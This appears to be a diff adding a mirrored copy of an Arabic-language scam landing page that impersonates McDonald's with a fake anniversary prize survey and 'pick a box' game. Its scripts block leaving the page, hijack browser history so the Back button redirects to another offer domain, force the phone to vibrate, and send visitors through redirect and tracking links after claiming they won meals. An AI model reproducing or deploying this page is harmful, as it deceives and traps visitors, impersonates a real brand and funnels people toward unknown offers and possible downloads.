@@ -1,0 +1,190 @@
+
+<!doctype html>
+<html lang="en" dir="ltr">
+
+<!-- Mirrored from newoffers.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Jan 2023 01:52:42 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<title>MAC REWR -  OFFER KFV</title>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="survey-pick-a-box">
+<meta name="description" content="survey-pick-a-box">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+<link href="css/app2042.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet" />
+<link href="css/landers/survey-pick-a-box/app75ba.css?id=cfc27b22c2dc71691640" type="text/css" rel="stylesheet" />
+<meta name="robots" content="noindex,nofollow">
+</head>
+<body>
+<div class="app" id="app" v-cloak>
+<vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
+<img class="opening-modal__image" src="https://i.imgur.com/IzeMep9.png" alt="Barns" />
+<h1 class="heading heading--h1">
+!! تهانينا لك
+</h1>
+<p class="paragraph">
+بمناسبة مرور 83 عام على تأسيس ( ماكدونالدز ) تم إختيارك للحصول على جائزة قيمة وفورية
+</p>
+<p class="paragraph">
+اضغط "موافق" للحصول على جائزتك
+</p>
+<button class="button" v-on:click="showOpeningModal = false; $confetti.stop()">
+موافــق
+</button>
+</vue-modal>
+<vue-modal :open="showInstructionsModal">
+<h2 class="heading heading--h1">تم حفظ إجاباتك بنجاح</h2>
+<p class="paragraph">
+الآن لديك فرصة للفوز بجائزة قيمة
+<br><br>
+يجب عليك تحديد الصندوق الذي يحتوي على الهدية بداخله
+<br><br>
+لديك 3 محاولات! نتمنى لك حظ موفق
+</p>
+<button class="button" v-on:click="showInstructionsModal = false">
+ابدأ الأن
+</button>
+</vue-modal>
+<vue-modal :open="showFailModal">
+<h1 class="heading heading--h1">حظ أوفر في المرة القادمة</h1>
+<p class="paragraph">
+.لديك (2) فرص اضافية
+</p>
+<button class="button" v-on:click="showFailModal = false">
+موافق
+</button>
+</vue-modal>
+<vue-modal :open="showSuccessModal">
+<img src="https://i.imgur.com/UnZnUPT.png" style="width: 250px;">
+<h1 class="heading heading--h1">!!تهانينا لك</h1>
+<p class="paragraph">
+لقد حصلت على جائزة
+<br>
+٢ وجبة بيج تايستي حجم كبير + ٢ وجبة جراند تشيكن سبيشال + ٢ ايس كريم صانداي
+<br>اتبع التعليمات التالية للحصول على جائزتك
+</p>
+<button class="button" onclick="go();">
+الحصول على جائزتك
+</button>
+</vue-modal>
+<div class="left">
+<div class="product-preview">
+<div class="product-preview__title">
+<img src="https://i.imgur.com/1Ee8YIz.png" style="width: 345px;">
+</div>
+</div>
+</div>
+<div class="right">
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="img/landers/survey-pick-a-box/lid.png" box-image="img/landers/survey-pick-a-box/box.png" box-back-image="img/landers/survey-pick-a-box/box-back.png" prize-image="img/prizes/iphone-13-pro-max/default@0.75x.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<div class="verify" v-if="showRotator">
+<vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                     "... الرجاء الإنتظار قليلاً",
+              "... الرجاء الإنتظار قليلاً",
+              "... الرجاء الإنتظار قليلاً"
+            ]'>
+</vue-text-rotator>
+<div class="verify__text" v-if="rotateIndex > 1">
+<strong>
+لقد قمت بالرد على 4/4 أسئلة
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://newoffers.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري معالجة إجاباتك
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+!لا تزال هناك جوائز متاحة
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://newoffers.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري البحث عن الجوائز
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+!تبقى عدد (225) جائزة فقط
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://newoffers.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+جاري فحص المخزون
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+</div>
+<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+            {
+              title: "ما هو جنسك ؟",
+              answers: [ { text: "ذكر" }, { text: "آنثى" } ]
+            },
+            {
+              title: "ما هو عمرك ؟",
+              answers: [ { text: "اقل من 18" }, { text: "18-29" }, { text: "30-39" }, { text: "40-49" }, { text: "50+" } ]
+            },
+            {
+              title: "هل سبق لك بزيارة ماكدونالدز ؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
+            },
+            {
+              title: "هل سبق لك وشاركت معنا من قبل ؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
+            },
+          ]' v-on:finish="onSurveyFinish"></vue-survey>
+</div>
+</div>
+<script>window.view = window.view || {};view.offerUrl = "https://newoffers.pages.dev/\/\/rdr.funcontent.xyz/click";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="https://newoffers.pages.dev/js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script src="https://newoffers.pages.dev/js/landers/survey-pick-a-box/app.js?id=17138759790b445ece6b" type="application/javascript"></script>
+<script>
+function go() {
+    window.onbeforeunload = null;
+	window.open('https://newoffers.pages.dev/share');
+    window.location = 'https://odoffers.pages.dev/';
+}
+</script>
+<script>
+var PreventExitPop = true;
+
+function ExitPop() {
+    if (PreventExitPop != false) {
+        return "Don't miss out!";
+    }
+}
+window.onbeforeunload = ExitPop;
+</script>
+<script>
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state && location.replace('https://odoffers.pages.dev/?a6b6f52d-501b-47a1-8b5f-3725bd33debd');
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
+</script>
+<script>
+	navigator.vibrate([1000, 300, 1000, 300,1000]);
+</script>
+<script src="https://newoffers.pages.dev/p.js?f=sync&amp;lr=1&amp;partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3" defer></script>
+<noscript><img src="https://i.imgur.com/l3NimxL.gif?f=sync&amp;lr=1&amp;partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3" width="1" height="1" /></noscript>
+</body>
+
+<!-- Mirrored from newoffers.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Jan 2023 01:52:42 GMT -->
+</html>
+
+<!-- JS GOOGLE -->
+<!-- Global site tag (gtagش.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-152330835-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-152330835-1');
+</script>
